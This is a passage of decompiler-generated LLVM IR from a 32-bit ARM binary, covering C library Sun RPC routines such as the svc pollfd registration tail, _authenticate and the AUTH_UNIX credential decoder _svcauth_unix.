  %v4_17e88 = call i32 @__GI___rpc_thread_svc_fdset(i32 %v0_17e6c, i32 %v1_17e88, i32 %v2_17e88, i32 %v3_17e78)
  %v0_17e8c = load i32, i32* @r7, align 4
  %v3_17e8c = udiv i32 %v0_17e8c, 32
  %v4_17e90 = mul nuw nsw i32 %v3_17e8c, 4
  %v5_17e90 = add i32 %v4_17e90, %v4_17e88
  %v6_17e90 = inttoptr i32 %v5_17e90 to i32*
  %v7_17e90 = load i32, i32* %v6_17e90, align 4
  %v1_17e94 = urem i32 %v0_17e8c, 32
  store i32 %v1_17e94, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v7_17e9c = shl i32 1, %v1_17e94
  %v8_17e9c = or i32 %v7_17e9c, %v7_17e90
  store i32 %v8_17e9c, i32* %r3.global-to-local, align 4
  store i32 %v8_17e9c, i32* %v6_17e90, align 4
  br label %dec_label_pc_17eec

dec_label_pc_17eac:                               ; preds = %dec_label_pc_17eec
  %v0_17eac = call i32 @__rpc_thread_svc_pollfd()
  %v1_17eb0 = inttoptr i32 %v0_17eac to i32*
  %v2_17eb0 = load i32, i32* %v1_17eb0, align 4
  store i32 %v2_17eb0, i32* %r2.global-to-local, align 4
  %v1_17eb4 = load i32, i32* @r5, align 4
  %v4_17eb4 = mul i32 %v1_17eb4, 8
  %v5_17eb4 = add i32 %v4_17eb4, %v2_17eb0
  %v6_17eb4 = inttoptr i32 %v5_17eb4 to i32*
  %v7_17eb4 = load i32, i32* %v6_17eb4, align 4
  store i32 %v7_17eb4, i32* %r3.global-to-local, align 4
  %v3_17eb8 = icmp eq i32 %v7_17eb4, -1
  store i32 %v0_17eac, i32* %r1.global-to-local, align 4
  %v3_17ec0 = mul i32 %v1_17eb4, 8
  %v1_17ee8 = add i32 %v1_17eb4, 1
  br i1 %v3_17eb8, label %dec_label_pc_17ec8, label %dec_label_pc_17eec

dec_label_pc_17ec8:                               ; preds = %dec_label_pc_17eac
  %v0_17ec8 = load i32, i32* @r7, align 4
  store i32 %v0_17ec8, i32* %v6_17eb4, align 4
  %v0_17ecc = load i32, i32* %r1.global-to-local, align 4
  %v1_17ecc = inttoptr i32 %v0_17ecc to i32*
  %v2_17ecc = load i32, i32* %v1_17ecc, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_17ed4 = add i32 %v2_17ecc, %v3_17ec0
  store i32 %v2_17ed4, i32* %r3.global-to-local, align 4
  %v3_17ed8 = add i32 %v2_17ed4, 5
  %v4_17ed8 = inttoptr i32 %v3_17ed8 to i8*
  store i8 0, i8* %v4_17ed8, align 1
  %v0_17edc = load i32, i32* %r2.global-to-local, align 4
  %v1_17edc = add i32 %v0_17edc, 195
  store i32 %v1_17edc, i32* %r2.global-to-local, align 4
  %v1_17ee0 = trunc i32 %v1_17edc to i8
  %v2_17ee0 = load i32, i32* %r3.global-to-local, align 4
  %v3_17ee0 = add i32 %v2_17ee0, 4
  %v4_17ee0 = inttoptr i32 %v3_17ee0 to i8*
  store i8 %v1_17ee0, i8* %v4_17ee0, align 1
  ret i32 %v3_17ec0

dec_label_pc_17eec:                               ; preds = %dec_label_pc_17e88, %bb11, %dec_label_pc_17eac
  %storemerge = phi i32 [ %v1_17ee8, %dec_label_pc_17eac ], [ 0, %bb11 ], [ 0, %dec_label_pc_17e88 ]
  store i32 %storemerge, i32* @r5, align 4
  %v0_17eec = call i32 @__rpc_thread_svc_max_pollfd()
  %v1_17ef0 = inttoptr i32 %v0_17eec to i32*
  %v2_17ef0 = load i32, i32* %v1_17ef0, align 4
  store i32 %v2_17ef0, i32* @r4, align 4
  %v0_17ef4 = load i32, i32* @r5, align 4
  store i32 %v0_17eec, i32* @r6, align 4
  %v5_17efc = icmp slt i32 %v0_17ef4, %v2_17ef0
  br i1 %v5_17efc, label %dec_label_pc_17eac, label %dec_label_pc_17f00

dec_label_pc_17f00:                               ; preds = %dec_label_pc_17eec
  %v1_17f00 = add i32 %v2_17ef0, 1
  store i32 %v1_17f00, i32* @r4, align 4
  store i32 %v1_17f00, i32* %v1_17ef0, align 4
  %v0_17f08 = call i32 @__rpc_thread_svc_pollfd()
  %v0_17f0c = load i32, i32* @r4, align 4
  %v3_17f0c = mul i32 %v0_17f0c, 8
  store i32 %v3_17f0c, i32* %r1.global-to-local, align 4
  store i32 %v0_17f08, i32* @r5, align 4
  %v1_17f14 = inttoptr i32 %v0_17f08 to i32*
  %v2_17f14 = load i32, i32* %v1_17f14, align 4
  %v2_17f18 = call i32 @realloc(i32 %v2_17f14, i32 %v3_17f0c)
  %v2_17f1c = icmp eq i32 %v2_17f18, 0
  %v1_17f20 = load i32, i32* @r5, align 4
  %v2_17f20 = inttoptr i32 %v1_17f20 to i32*
  store i32 %v2_17f18, i32* %v2_17f20, align 4
  br i1 %v2_17f1c, label %bb12, label %bb13

bb12:                                             ; preds = %dec_label_pc_17f00
  ret i32 0

bb13:                                             ; preds = %dec_label_pc_17f00
  %v0_17f28 = load i32, i32* @r6, align 4
  %v1_17f28 = inttoptr i32 %v0_17f28 to i32*
  %v2_17f28 = load i32, i32* %v1_17f28, align 4
  %v4_17f2c = mul i32 %v2_17f28, 8
  %v5_17f2c = add i32 %v4_17f2c, %v2_17f18
  store i32 %v5_17f2c, i32* %r3.global-to-local, align 4
  %v0_17f30 = load i32, i32* @r7, align 4
  %v2_17f30 = add i32 %v5_17f2c, -8
  %v3_17f30 = inttoptr i32 %v2_17f30 to i32*
  store i32 %v0_17f30, i32* %v3_17f30, align 4
  %v0_17f34 = load i32, i32* @r6, align 4
  %v1_17f34 = inttoptr i32 %v0_17f34 to i32*
  %v2_17f34 = load i32, i32* %v1_17f34, align 4
  store i32 %v2_17f34, i32* %r2.global-to-local, align 4
  %v0_17f38 = load i32, i32* @r5, align 4
  %v1_17f38 = inttoptr i32 %v0_17f38 to i32*
  %v2_17f38 = load i32, i32* %v1_17f38, align 4
  %v4_17f3c = mul i32 %v2_17f34, 8
  %v5_17f3c = add i32 %v2_17f38, %v4_17f3c
  store i32 %v5_17f3c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_17f44 = add i32 %v5_17f3c, -3
  %v4_17f44 = inttoptr i32 %v3_17f44 to i8*
  store i8 0, i8* %v4_17f44, align 1
  %v0_17f48 = load i32, i32* %r2.global-to-local, align 4
  %v1_17f48 = add i32 %v0_17f48, 195
  store i32 %v1_17f48, i32* %r2.global-to-local, align 4
  %v1_17f4c = trunc i32 %v1_17f48 to i8
  %v2_17f4c = load i32, i32* %r3.global-to-local, align 4
  %v3_17f4c = add i32 %v2_17f4c, -4
  %v4_17f4c = inttoptr i32 %v3_17f4c to i8*
  store i8 %v1_17f4c, i8* %v4_17f4c, align 1
  ret i32 %v2_17f18

; uselistorder directives
  uselistorder i32 %v2_17f18, { 1, 0, 2, 3 }
  uselistorder i32 %v3_17f0c, { 1, 0 }
  uselistorder i32 %v0_17f08, { 1, 0 }
  uselistorder i32 %v1_17eb4, { 1, 0, 2 }
  uselistorder i32 %v1_17e94, { 1, 0 }
  uselistorder i32 %v0_17e8c, { 1, 0 }
  uselistorder i32 %v3_17e78, { 1, 0, 2 }
  uselistorder i32 %v0_17e70, { 1, 0, 2 }
  uselistorder i32 %v0_17e6c, { 1, 0, 2 }
  uselistorder i32 ()* @__rpc_thread_svc_max_pollfd, { 2, 1, 0 }
  uselistorder i32 ()* @__rpc_thread_svc_pollfd, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__GI___rpc_thread_svc_fdset, { 1, 0 }
  uselistorder i32 ()* @_rpc_dtablesize, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_17eec, { 2, 0, 1 }
  uselistorder label %bb9, { 1, 0 }
}

define i32 @_authenticate(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9, i32 %arg10, i32 %arg11, i32 %arg12) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_17f54 = load i32, i32* @r4, align 4
  store i32 %v3_17f54, i32* %stack_var_-8, align 4
  %v1_17f58 = add i32 %arg2, 24
  store i32 %arg1, i32* %ip.global-to-local, align 4
  store i32 %arg2, i32* %lr.global-to-local, align 4
  %v1_17f64 = inttoptr i32 %v1_17f58 to i32*
  %v2_17f64 = load i32, i32* %v1_17f64, align 4
  store i32 %v2_17f64, i32* %r0.global-to-local, align 4
  %v3_17f64 = add i32 %arg2, 28
  %v4_17f64 = inttoptr i32 %v3_17f64 to i32*
  %v5_17f64 = load i32, i32* %v4_17f64, align 4
  store i32 %v5_17f64, i32* %r1.global-to-local, align 4
  %v6_17f64 = add i32 %arg2, 32
  %v7_17f64 = inttoptr i32 %v6_17f64 to i32*
  %v8_17f64 = load i32, i32* %v7_17f64, align 4
  store i32 %v8_17f64, i32* %r2.global-to-local, align 4
  %v1_17f68 = add i32 %arg1, 12
  %v1_17f6c = inttoptr i32 %v1_17f68 to i32*
  store i32 %v2_17f64, i32* %v1_17f6c, align 4
  %v3_17f6c = add i32 %arg1, 16
  %v4_17f6c = inttoptr i32 %v3_17f6c to i32*
  %v5_17f6c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_17f6c, i32* %v4_17f6c, align 4
  %v6_17f6c = add i32 %arg1, 20
  %v7_17f6c = inttoptr i32 %v6_17f6c to i32*
  %v8_17f6c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_17f6c, i32* %v7_17f6c, align 4
  %v2_17f74 = load i32, i32* @global_var_302f0.870, align 4
  store i32 %v2_17f74, i32* %r2.global-to-local, align 4
  %v0_17f78 = load i32, i32* %ip.global-to-local, align 4
  %v1_17f78 = add i32 %v0_17f78, 28
  %v2_17f78 = inttoptr i32 %v1_17f78 to i32*
  %v3_17f78 = load i32, i32* %v2_17f78, align 4
  %v2_17f7c = add i32 %v3_17f78, 32
  %v3_17f7c = inttoptr i32 %v2_17f7c to i32*
  store i32 %v2_17f74, i32* %v3_17f7c, align 4
  %v0_17f80 = load i32, i32* %ip.global-to-local, align 4
  %v1_17f80 = add i32 %v0_17f80, 12
  %v2_17f80 = inttoptr i32 %v1_17f80 to i32*
  %v3_17f80 = load i32, i32* %v2_17f80, align 4
  store i32 %v3_17f80, i32* %r4.global-to-local, align 4
  %v1_17f84 = add i32 %v0_17f80, 28
  %v2_17f84 = inttoptr i32 %v1_17f84 to i32*
  %v3_17f84 = load i32, i32* %v2_17f84, align 4
  store i32 %v3_17f84, i32* %r2.global-to-local, align 4
  store i32 %v0_17f80, i32* %r0.global-to-local, align 4
  %v0_17f94 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v0_17f94, i32* %r1.global-to-local, align 4
  store i32 2, i32* %ip.global-to-local, align 4
  %v2_17f9c = add i32 %v3_17f84, 40
  %v3_17f9c = inttoptr i32 %v2_17f9c to i32*
  store i32 0, i32* %v3_17f9c, align 4
  store i32 98224, i32* %lr.global-to-local, align 4
  %v1_17fac = load i32, i32* %r4.global-to-local, align 4
  %v4_17fac = mul i32 %v1_17fac, 4
  %v5_17fac = add i32 %v4_17fac, ptrtoint (i32* @global_var_1e93c.904 to i32)
  %v6_17fac = inttoptr i32 %v5_17fac to i32*
  %v7_17fac = load i32, i32* %v6_17fac, align 4
  call void @__pseudo_branch(i32 %v7_17fac)
  %v0_17fb0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_17fb0, i32* %ip.global-to-local, align 4
  %v2_17fb8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_17fb8, i32* @r4, align 4
  ret i32 %v0_17fb0

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32 %arg2, { 3, 2, 1, 0, 4 }
  uselistorder i32 %arg1, { 2, 1, 0, 3, 4 }
}

define i32 @_svcauth_null() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @_svcauth_short() local_unnamed_addr {
entry:
  ret i32 2
}

define i32 @_svcauth_unix(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_17fd4 = load i32, i32* @r4, align 4
  store i32 %v3_17fd4, i32* %stack_var_-28, align 4
  %v6_17fd4 = load i32, i32* @r5, align 4
  %v9_17fd4 = load i32, i32* @r6, align 4
  %v12_17fd4 = load i32, i32* @r7, align 4
  %v15_17fd4 = load i32, i32* @r8, align 4
  %v1_17fd8 = add i32 %arg1, 24
  %v2_17fd8 = inttoptr i32 %v1_17fd8 to i32*
  %v3_17fd8 = load i32, i32* %v2_17fd8, align 4
  store i32 %v3_17fd8, i32* @r6, align 4
  %v1_17fdc = add i32 %v3_17fd8, 24
  %v1_17fe0 = add i32 %v3_17fd8, 280
  store i32 %v1_17fe0, i32* %r2.global-to-local, align 4
  %v2_17fe4 = add i32 %v3_17fd8, 4
  %v3_17fe4 = inttoptr i32 %v2_17fe4 to i32*
  store i32 %v1_17fdc, i32* %v3_17fe4, align 4
  %v0_17fe8 = load i32, i32* %r2.global-to-local, align 4
  %v1_17fe8 = load i32, i32* @r6, align 4
  %v2_17fe8 = add i32 %v1_17fe8, 20
  %v3_17fe8 = inttoptr i32 %v2_17fe8 to i32*
  store i32 %v0_17fe8, i32* %v3_17fe8, align 4
  %v1_17fec = add i32 %arg2, 32
  %v2_17fec = inttoptr i32 %v1_17fec to i32*
  %v3_17fec = load i32, i32* %v2_17fec, align 4
  store i32 %v3_17fec, i32* @r8, align 4
  %v2_17ff0 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v3_17fec, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @sl, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %v2_17ff0, i32* %r0.global-to-local, align 4
  %v1_18008 = add i32 %arg2, 28
  %v2_18008 = inttoptr i32 %v1_18008 to i32*
  %v3_18008 = load i32, i32* %v2_18008, align 4
  %v4_1800c = load i32, i32* %stack_var_-28, align 4
  %v10_1800c = call i32 @__GI_xdrmem_create(i32* nonnull %stack_var_-52, i32 %v3_18008, i32 %v3_17fec, i32 1, i32 %v4_1800c, i32 %v6_17fd4, i32 %v9_17fd4, i32 %v12_17fd4, i32 %v15_17fd4)
  store i32 %v2_17ff0, i32* %r0.global-to-local, align 4
  %v3_18018 = load i32, i32* %stack_var_-48, align 4
  store i32 ptrtoint (i32* @global_var_18024.905 to i32), i32* @lr, align 4
  %v1_18020 = add i32 %v3_18018, 24
  %v2_18020 = inttoptr i32 %v1_18020 to i32*
  %v3_18020 = load i32, i32* %v2_18020, align 4
  call void @__pseudo_branch(i32 %v3_18020)
  %v0_18024 = load i32, i32* %r0.global-to-local, align 4
  %v2_18024 = icmp eq i32 %v0_18024, 0
  br i1 %v2_18024, label %dec_label_pc_1818c, label %dec_label_pc_1802c

dec_label_pc_1802c:                               ; preds = %entry
  %v2_18030 = load i32, i32* %stack_var_-52, align 4
  %v5_18030 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v5_18030, i32* %r4.global-to-local, align 4
  %v2_1804c = call i32 @llvm.bswap.i32(i32 %v2_18030)
  %v1_18050 = load i32, i32* @r6, align 4
  %v2_18050 = inttoptr i32 %v1_18050 to i32*
  store i32 %v2_1804c, i32* %v2_18050, align 4
  %v3_18054 = load i32, i32* %stack_var_-48, align 4
  %v1_18058 = udiv i32 %v3_18054, 256
  %v3_18060 = and i32 %v1_18058, 65280
  %v4_1806c = udiv i32 %v3_18054, 16777216
  %v5_1806c = or i32 %v3_18060, %v4_1806c
  store i32 %v5_1806c, i32* %r2.global-to-local, align 4
  %v2_18070 = call i32 @llvm.bswap.i32(i32 %v3_18054)
  store i32 %v2_18070, i32* @r5, align 4
  %v2_18074 = icmp ugt i32 %v2_18070, 254
  %v2_18078 = icmp ne i32 %v3_18054, -16777216
  %v3_18078 = and i1 %v2_18074, %v2_18078
  br i1 %v3_18078, label %dec_label_pc_181f4, label %dec_label_pc_1807c

dec_label_pc_1807c:                               ; preds = %dec_label_pc_1802c
  %v2_1807c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_1807c, i32* @r4, align 4
  store i32 %v2_1807c, i32* @r1, align 4
  store i32 %v2_18070, i32* @r2, align 4
  %v0_18088 = load i32, i32* @r6, align 4
  %v1_18088 = add i32 %v0_18088, 4
  %v2_18088 = inttoptr i32 %v1_18088 to i32*
  %v3_18088 = load i32, i32* %v2_18088, align 4
  store i32 %v3_18088, i32* @r0, align 4
  %v0_1808c = call i32 @memcpy()
  store i32 %v0_1808c, i32* %r0.global-to-local, align 4
  %v0_18090 = load i32, i32* @r6, align 4
  %v1_18090 = add i32 %v0_18090, 4
  %v2_18090 = inttoptr i32 %v1_18090 to i32*
  %v3_18090 = load i32, i32* %v2_18090, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_18098 = load i32, i32* @r5, align 4
  %v4_18098 = add i32 %v3_18098, %v3_18090
  %v5_18098 = inttoptr i32 %v4_18098 to i8*
  store i8 0, i8* %v5_18098, align 1
  %v0_1809c = load i32, i32* @r5, align 4
  %v1_1809c = add i32 %v0_1809c, 3
  %v1_180a0 = and i32 %v1_1809c, -4
  store i32 %v1_180a0, i32* %r5.global-to-local, align 4
  %v0_180a4 = load i32, i32* @r4, align 4
  %v2_180a4 = add i32 %v0_180a4, %v1_180a0
  %v3_180a4 = inttoptr i32 %v2_180a4 to i32*
  %v4_180a4 = load i32, i32* %v3_180a4, align 4
  %v1_180ac = mul i32 %v4_180a4, 256
  %v3_180b4 = and i32 %v1_180ac, 16711680
  %v4_180b8 = mul i32 %v4_180a4, 16777216
  %v5_180b8 = or i32 %v3_180b4, %v4_180b8
  store i32 %v5_180b8, i32* %r2.global-to-local, align 4
  %v2_180c0 = call i32 @llvm.bswap.i32(i32 %v4_180a4)
  %v1_180c4 = load i32, i32* @r6, align 4
  %v2_180c4 = add i32 %v1_180c4, 8
  %v3_180c4 = inttoptr i32 %v2_180c4 to i32*
  store i32 %v2_180c0, i32* %v3_180c4, align 4
  %v0_180c8 = load i32, i32* @r4, align 4
  %v1_180c8 = load i32, i32* %r5.global-to-local, align 4
  %v2_180c8 = add i32 %v1_180c8, %v0_180c8
  store i32 %v2_180c8, i32* %r4.global-to-local, align 4
  %v1_180cc = add i32 %v2_180c8, 4
  %v2_180cc = inttoptr i32 %v1_180cc to i32*
  %v3_180cc = load i32, i32* %v2_180cc, align 4
  %v1_180d4 = mul i32 %v3_180cc, 256
  %v3_180dc = and i32 %v1_180d4, 16711680
  %v4_180e0 = mul i32 %v3_180cc, 16777216
  %v5_180e0 = or i32 %v3_180dc, %v4_180e0
  store i32 %v5_180e0, i32* %r2.global-to-local, align 4
  %v2_180e8 = call i32 @llvm.bswap.i32(i32 %v3_180cc)
  %v1_180ec = load i32, i32* @r6, align 4
  %v2_180ec = add i32 %v1_180ec, 12
  %v3_180ec = inttoptr i32 %v2_180ec to i32*
  store i32 %v2_180e8, i32* %v3_180ec, align 4
  %v0_180f0 = load i32, i32* %r4.global-to-local, align 4
  %v1_180f0 = add i32 %v0_180f0, 4
  store i32 %v1_180f0, i32* %r4.global-to-local, align 4
  %v1_180f4 = add i32 %v0_180f0, 8
  %v2_180f4 = inttoptr i32 %v1_180f4 to i32*
  %v3_180f4 = load i32, i32* %v2_180f4, align 4
  %v1_180f8 = udiv i32 %v3_180f4, 256
  %v3_18100 = and i32 %v1_180f8, 65280
  %v4_1810c = udiv i32 %v3_180f4, 16777216
  %v5_1810c = or i32 %v3_18100, %v4_1810c
  store i32 %v5_1810c, i32* %r2.global-to-local, align 4
  %v2_18110 = call i32 @llvm.bswap.i32(i32 %v3_180f4)
  store i32 %v2_18110, i32* %ip.global-to-local, align 4
  %v7_18114 = icmp eq i32 %v3_180f4, 268435456
  %v2_1811c = icmp ult i32 %v2_18110, 16
  %v3_1811c = or i1 %v7_18114, %v2_1811c
  br i1 %v3_1811c, label %dec_label_pc_1815c.preheader, label %.thread41

.thread41:                                        ; preds = %dec_label_pc_1807c
  store i32 %v1_180f4, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_181f4

dec_label_pc_1815c.preheader:                     ; preds = %dec_label_pc_1807c
  %v5_1811c = add i32 %v0_180f0, 12
  store i32 %v5_1811c, i32* %r4.global-to-local, align 4
  %v4_18120 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v4_18120, i32* %lr.global-to-local, align 4
  %v5_18124 = load i32, i32* @r6, align 4
  %v6_18124 = add i32 %v5_18124, 16
  %v7_18124 = inttoptr i32 %v6_18124 to i32*
  store i32 %v2_18110, i32* %v7_18124, align 4
  %v0_1815c14 = load i32, i32* %lr.global-to-local, align 4
  %v1_1815c15 = load i32, i32* %ip.global-to-local, align 4
  %v3_1815c17 = icmp ult i32 %v0_1815c14, %v1_1815c15
  br i1 %v3_1815c17, label %dec_label_pc_18130, label %dec_label_pc_18164

dec_label_pc_18130:                               ; preds = %dec_label_pc_1815c.preheader, %dec_label_pc_18130
  %v2_18154 = phi i32 [ %v1_18158, %dec_label_pc_18130 ], [ %v0_1815c14, %dec_label_pc_1815c.preheader ]
  %v0_18130 = load i32, i32* %r4.global-to-local, align 4
  %v1_18130 = inttoptr i32 %v0_18130 to i32*
  %v2_18130 = load i32, i32* %v1_18130, align 4
  %v4_18130 = add i32 %v0_18130, 4
  store i32 %v4_18130, i32* %r4.global-to-local, align 4
  %v1_18138 = mul i32 %v2_18130, 256
  %v3_18140 = and i32 %v1_18138, 16711680
  store i32 %v3_18140, i32* %r2.global-to-local, align 4
  %v0_18144 = load i32, i32* @r6, align 4
  %v1_18144 = add i32 %v0_18144, 20
  %v2_18144 = inttoptr i32 %v1_18144 to i32*
  %v3_18144 = load i32, i32* %v2_18144, align 4
  store i32 %v3_18144, i32* %r0.global-to-local, align 4
  %v4_18148 = mul i32 %v2_18130, 16777216
  %v5_18148 = or i32 %v3_18140, %v4_18148
  store i32 %v5_18148, i32* %r2.global-to-local, align 4
  %v2_18150 = call i32 @llvm.bswap.i32(i32 %v2_18130)
  %v5_18154 = mul i32 %v2_18154, 4
  %v6_18154 = add i32 %v3_18144, %v5_18154
  %v7_18154 = inttoptr i32 %v6_18154 to i32*
  store i32 %v2_18150, i32* %v7_18154, align 4
  %v0_18158 = load i32, i32* %lr.global-to-local, align 4
  %v1_18158 = add i32 %v0_18158, 1
  store i32 %v1_18158, i32* %lr.global-to-local, align 4
  %v1_1815c = load i32, i32* %ip.global-to-local, align 4
  %v3_1815c = icmp ult i32 %v1_18158, %v1_1815c
  br i1 %v3_1815c, label %dec_label_pc_18130, label %dec_label_pc_1815c.dec_label_pc_18164_crit_edge

dec_label_pc_1815c.dec_label_pc_18164_crit_edge:  ; preds = %dec_label_pc_18130
  br label %dec_label_pc_18164

dec_label_pc_18164:                               ; preds = %dec_label_pc_1815c.preheader, %dec_label_pc_1815c.dec_label_pc_18164_crit_edge
  %v0_18174 = phi i32 [ %v1_1815c, %dec_label_pc_1815c.dec_label_pc_18164_crit_edge ], [ %v1_1815c15, %dec_label_pc_1815c.preheader ]
  %v0_18164 = load i32, i32* %r5.global-to-local, align 4
  %v1_18164 = add i32 %v0_18164, 20
  %v4_18168 = mul i32 %v0_18174, 4
  %v5_18168 = add i32 %v1_18164, %v4_18168
  %v1_1816c = load i32, i32* @r8, align 4
  %tmp = icmp ugt i32 %v5_18168, %v1_1816c
  br i1 %tmp, label %dec_label_pc_18174, label %dec_label_pc_181b8

dec_label_pc_18174:                               ; preds = %dec_label_pc_18164
  store i32 %v0_18164, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([36 x i8]* @global_var_1e948.907 to i32), i32* %r0.global-to-local, align 4
  %v6_18184 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @global_var_1e948.907, i32 0, i32 0), i32 %v0_18174, i32 %v0_18164, i32 %v1_1816c)
  store i32 %v6_18184, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_181f4

dec_label_pc_1818c:                               ; preds = %entry
  store i32 %v2_17ff0, i32* %r0.global-to-local, align 4
  %v0_18190 = load i32, i32* @r6, align 4
  %v3_18194 = call i32 @__GI_xdr_authunix_parms(i32* nonnull %stack_var_-52, i32 %v0_18190)
  store i32 %v3_18194, i32* %r0.global-to-local, align 4
  %v2_18198 = icmp eq i32 %v3_18194, 0
  br i1 %v2_18198, label %dec_label_pc_181a0, label %dec_label_pc_181b8

dec_label_pc_181a0:                               ; preds = %dec_label_pc_1818c
  store i32 %v2_17ff0, i32* %r0.global-to-local, align 4
  %v0_181a8 = load i32, i32* @r6, align 4
  store i32 2, i32* %stack_var_-52, align 4
  %v3_181b0 = call i32 @__GI_xdr_authunix_parms(i32* nonnull %stack_var_-52, i32 %v0_181a8)
  store i32 %v3_181b0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_181f4

dec_label_pc_181b8:                               ; preds = %dec_label_pc_18164, %dec_label_pc_1818c
  %v0_181b8 = load i32, i32* @r7, align 4
  %v1_181b8 = add i32 %v0_181b8, 44
  %v2_181b8 = inttoptr i32 %v1_181b8 to i32*
  %v3_181b8 = load i32, i32* %v2_181b8, align 4
  store i32 %v3_181b8, i32* %ip.global-to-local, align 4
  %v2_181bc = icmp eq i32 %v3_181b8, 0
  %v0_181c0 = load i32, i32* @sl, align 4
  %v1_181c0 = add i32 %v0_181c0, 28
  %v2_181c0 = inttoptr i32 %v1_181c0 to i32*
  %v3_181c0 = load i32, i32* %v2_181c0, align 4
  store i32 %v3_181c0, i32* %r2.global-to-local, align 4
  br i1 %v2_181bc, label %.thread11, label %._crit_edge

._crit_edge:                                      ; preds = %dec_label_pc_181b8
  %v2_181c4 = add i32 %v0_181b8, 36
  %v3_181c4 = inttoptr i32 %v2_181c4 to i32*
  %v4_181c4 = load i32, i32* %v3_181c4, align 4
  %v3_181c8 = add i32 %v3_181c0, 32
  %v4_181c8 = inttoptr i32 %v3_181c8 to i32*
  store i32 %v4_181c4, i32* %v4_181c8, align 4
  %v1_181cc = load i32, i32* @r7, align 4
  %v2_181cc = add i32 %v1_181cc, 40
  %v3_181cc = inttoptr i32 %v2_181cc to i32*
  %v4_181cc = load i32, i32* %v3_181cc, align 4
  store i32 %v4_181cc, i32* %r2.global-to-local, align 4
  %v1_181d0 = load i32, i32* @sl, align 4
  %v2_181d0 = add i32 %v1_181d0, 28
  %v3_181d0 = inttoptr i32 %v2_181d0 to i32*
  %v4_181d0 = load i32, i32* %v3_181d0, align 4
  %v3_181d8 = add i32 %v4_181d0, 36
  %v4_181d8 = inttoptr i32 %v3_181d8 to i32*
  store i32 %v4_181cc, i32* %v4_181d8, align 4
  %v1_181e0.pre = load i32, i32* @sl, align 4
  %phitmp = add i32 %v1_181e0.pre, 28
  %phitmp35 = inttoptr i32 %phitmp to i32*
  %v4_181e0 = load i32, i32* %phitmp35, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v0_181ec.pre = load i32, i32* %ip.global-to-local, align 4
  br label %bb

.thread11:                                        ; preds = %dec_label_pc_181b8
  %.pre = add i32 %v3_181c0, 32
  %.pre34 = inttoptr i32 %.pre to i32*
  store i32 0, i32* %.pre34, align 4
  %v1_181dc = load i32, i32* @sl, align 4
  %v2_181dc = add i32 %v1_181dc, 28
  %v3_181dc = inttoptr i32 %v2_181dc to i32*
  %v4_181dc = load i32, i32* %v3_181dc, align 4
  %v1_181e8 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v1_181e8, i32* %r4.global-to-local, align 4
  br label %bb

bb:                                               ; preds = %._crit_edge, %.thread11
  %v1_181ec43 = phi i32 [ %v4_181e0, %._crit_edge ], [ %v4_181dc, %.thread11 ]
  %v0_181ec = phi i32 [ %v0_181ec.pre, %._crit_edge ], [ %v1_181e8, %.thread11 ]
  %v2_181ec = add i32 %v1_181ec43, 40
  %v3_181ec = inttoptr i32 %v2_181ec to i32*
  store i32 %v0_181ec, i32* %v3_181ec, align 4
  br label %dec_label_pc_181f8

dec_label_pc_181f4:                               ; preds = %.thread41, %dec_label_pc_1802c, %dec_label_pc_181a0, %dec_label_pc_18174
  store i32 1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_181f8

dec_label_pc_181f8:                               ; preds = %bb, %dec_label_pc_181f4
  %v3_181f8 = load i32, i32* %stack_var_-48, align 4
  %v1_181fc = add i32 %v3_181f8, 28
  %v2_181fc = inttoptr i32 %v1_181fc to i32*
  %v3_181fc = load i32, i32* %v2_181fc, align 4
  %v2_18200 = icmp eq i32 %v3_181fc, 0
  br i1 %v2_18200, label %.thread13, label %bb55

bb55:                                             ; preds = %dec_label_pc_181f8
  store i32 %v2_17ff0, i32* %r0.global-to-local, align 4
  store i32 98832, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v3_181fc)
  br label %.thread13

